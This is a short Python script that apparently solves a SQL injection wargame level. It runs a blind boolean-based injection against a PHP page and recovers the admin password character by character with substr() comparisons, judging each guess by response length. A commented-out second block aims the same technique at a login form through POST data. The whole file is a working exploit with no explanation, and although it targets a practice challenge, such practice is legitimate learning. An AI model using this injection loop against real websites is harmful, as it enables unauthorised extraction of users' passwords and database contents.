import requests
import string

url = 'https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php'

mycookie = {
    'PHPSESSID': ''
}

letters = string.digits + string.ascii_letters
ans = ""
for i in range(1, 9):
    for char in letters:
        response = requests.get(url + "?pw=1' or id = 'admin' and substr(pw, {index}, 1) = \'{char}\'-- #".format(index = i, char = char), cookies=mycookie)        
        
        if len(response.text) == 4877:
            ans += char
            break
print(ans)

"""
for index in range(1, 22):
    for char_number in range(48, 123):
        char = chr(char_number)
        sql = 'admin\' AND SUBSTR((SELECT pass FROM user WHERE  id = \'admin\'), {index}, 1) = \'{char}\' --'.format(index = index, char = char)
        payload = {
            'id' : sql,
            'pass' : ''
        }
        response = requests.post(url, data=payload)
        if len(response.text) > 2000:
            print(char)
            break
"""